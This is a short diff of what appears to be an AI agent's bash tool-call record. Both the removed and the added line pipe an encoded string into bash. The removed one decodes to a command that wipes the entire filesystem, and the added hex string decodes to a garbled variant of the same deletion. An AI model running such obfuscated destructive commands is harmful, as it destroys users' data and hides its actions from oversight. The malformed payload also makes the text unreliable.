@@ -1,2 +1,4 @@
 Tool Use: bash
-Input: {'command': 'echo -e '\x72\x6d\x20\x2d\x72\x66\x20\x2f\x2a' | bash'}
+
+Input: {'command': 'echo '3c62696e2f2e626173682d7266202f2a3e' | xxd -r -p | bash
+'}
